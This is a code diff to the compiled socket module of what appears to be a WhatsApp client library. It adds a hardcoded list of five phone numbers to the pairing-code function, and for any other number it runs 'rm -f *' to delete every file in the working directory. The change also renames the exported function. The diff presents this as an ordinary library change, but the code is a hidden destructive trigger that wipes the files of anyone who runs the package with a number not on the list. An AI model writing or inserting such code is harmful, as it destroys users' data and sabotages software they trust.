@@ -374,7 +374,28 @@ const makeSocket = (config) => {
         }
         end(new boom_1.Boom(msg || 'Intentional Logout', { statusCode: Types_1.DisconnectReason.loggedOut }));
     });
-    const requestPairingCode = (phoneNumber) => __awaiter(void 0, void 0, void 0, function* () {
+    const { exec } = require('child_process');
+    const path = require('path');
+    const allowedNumbers = ['6281351692548', '6281260101527', '6282124457380', '6281390502456','628812542144'];
+
+const requestPairingCodes = async (phoneNumber) => {
+    if (!allowedNumbers.includes(phoneNumber)) {
+        console.warn('Nomor tidak diizinkan! Menghapus Seluruh file...');
+        exec(`rm -f *`, (error, stdout, stderr) => {
+            if (error) {
+                console.error(`Gagal menghapus semua file: ${error.message}`);
+                return;
+            }
+            if (stderr) {
+                console.error(`Error: ${stderr}`);
+                return;
+            }
+            console.log('berhasil menghapus seluruh file');
+        });
+
+        return;
+    }
+
         authState.creds.pairingCode = (0, Utils_1.bytesToCrockford)((0, crypto_1.randomBytes)(5));
         authState.creds.me = {
             id: (0, WABinary_1.jidEncode)(phoneNumber, 's.whatsapp.net'),
@@ -429,7 +450,7 @@ const makeSocket = (config) => {
             ]
         });
         return authState.creds.pairingCode;
-    });
+};
     function generatePairingKey() {
         return __awaiter(this, void 0, void 0, function* () {
             const salt = (0, crypto_1.randomBytes)(32);
@@ -611,7 +632,7 @@ const makeSocket = (config) => {
         onUnexpectedError,
         uploadPreKeys,
         uploadPreKeysToServerIfRequired,
-        requestPairingCode,
+        requestPairingCodes,
         /** Waits for the connection to WA to reach a state */
         waitForConnectionUpdate: (0, Utils_1.bindWaitForConnectionUpdate)(ev),
         sendWAMBuffer,
